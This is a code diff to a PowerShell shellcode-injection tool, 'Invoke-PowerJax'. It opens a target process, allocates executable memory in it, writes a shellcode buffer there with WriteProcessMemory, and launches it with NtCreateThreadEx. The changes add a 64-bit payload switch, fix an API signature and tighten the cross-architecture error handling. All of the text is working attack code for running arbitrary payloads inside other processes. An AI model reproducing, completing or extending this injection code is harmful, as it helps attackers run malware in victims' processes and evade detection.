@@ -335,7 +335,7 @@ function Invoke-PowerJax{
         (func kernel32 OpenProcess ([IntPtr]) @([Int32], [Bool], [Int32]) -SetLastError),
         (func kernel32 VirtualAllocEx ([IntPtr]) @([IntPtr], [IntPtr], [IntPtr], [Int32], [Int32]) -SetLastError),
         (func kernel32 VirtualAlloc ([IntPtr]) @([IntPtr], [IntPtr], [Int32], [Int32]) -SetLastError),
-        (func kernel32 WriteProcessMemory ([Bool]) @([IntPtr], [IntPtr], [byte[]], [int], [IntPtr]) -SetLastError),
+        (func kernel32 WriteProcessMemory ([Bool]) @([IntPtr], [IntPtr], [byte[]], [int], [IntPtr].MakeByRefType()) -SetLastError),
         (func kernel32 RtlMoveMemory ([Void]) @([IntPtr], [IntPtr], [Int]) -SetLastError),
         (func kernel32 CreateThread ([IntPtr]) @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError)
         (func kernel32 WaitForSingleObject ([Int32]) @([IntPtr], [Int32]) -SetLastError),
@@ -349,6 +349,7 @@ function Invoke-PowerJax{
     $Types = $FunctionDefinitions | Add-Win32Type -Module $module -Namespace 'Win32'
     $kernel32 = $Types['kernel32']
     $ntdll = $Types['ntdll']
+
 
 
     function Invoke-InjectShellcodeLocal{
@@ -375,18 +376,23 @@ function Invoke-PowerJax{
     }
     function Invoke-InjectShellcodeRemote{
         param(
-            [IntPtr]$ProcessHandle = [IntPtr]::Zero
+            [IntPtr]$ProcessHandle = [IntPtr]::Zero,
+            [switch]$64
         )
 
         If($ProcessHandle -eq [IntPtr]::Zero){
             Throw "Did not obtain ProcessHandle"
         }
+        If($64){
+            $global:buf = $global:buf64
+        }
 
-        $baseAddress = $kernel32::VirtualAllocEx($ProcessHandle, 0, $global:buf64.Length + 1, 0x3000, 0x40) #Allocate memory in the remote process 
-        Write-Verbose "$baseAddress"
+
+        $baseAddress = $kernel32::VirtualAllocEx($ProcessHandle, 0, $global:buf.Length + 1, 0x3000, 0x40) #Allocate memory in the remote process 
+        Write-Verbose "Allocated space for shellcode at: $baseAddress"
         [IntPtr]$bytesWritten = 0
-        $WriteResult = $kernel32::WriteProcessMemory($ProcessHandle, $baseAddress, $global:buf64, $global:buf64.Length, $bytesWritten) #Copy the shellcode to the remote process 
-        Write-Verbose "$WriteResult"
+        $WriteResult = $kernel32::WriteProcessMemory($ProcessHandle, $baseAddress, $global:buf, $global:buf.Length, $bytesWritten) #Copy the shellcode to the remote process 
+        Write-Verbose "Successfully copied shellcode to remote process? $WriteResult"
         [IntPtr]$ArgPtr = [IntPtr]::Zero
         [IntPtr]$ThreadHandle = [IntPtr]::Zero
         $ThreadResult = $ntdll::NtCreateThreadEx([ref]$ThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $baseAddress, $ArgPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) #Create thread in remote process 
@@ -406,20 +412,19 @@ function Invoke-PowerJax{
             Write-Verbose "Acquired process handle: $ProcessHandle" 
             $IsWow64 = $False 
             $Result = $kernel32::IsWow64Process($ProcessHandle, [ref]$IsWow64) #Check if the process is a Wow64 process
-            Write-Verbose "IsWow64Process ? $Result"
+            Write-Verbose "IsWow64Process ? $IsWow64"
             if(($IsWow64 -eq $false) -and ($script:CurrProcArc -eq 64)){
-                Invoke-InjectShellcodeRemote($ProcessHandle)
+                Invoke-InjectShellcodeRemote($ProcessHandle, $64)
             }
             elseif(($IsWow64 -eq $False) -and ($script:CurrProcArc -eq 32)){
-                Write-Verbose "Cannot inject shellcode from 32 -> 64"
+                Throw "Cannot inject shellcode from 32 -> 64"
                 #Cross architecture injection coming
-                break
             }
             elseif(($IsWow64) -and ($script:CurrProcArc -eq 32)){
                 Invoke-InjectShellcodeRemote($ProcessHandle)
             }
-            else{
-                Invoke-InjectShellcodeRemote($ProcessHandle)
+            elseif(($IsWow64) -and ($script:CurrProcArc -eq 64)){
+                Throw "Unable to inject shellcode from 64 -> 32"
                 #64 -> 32
             }
 
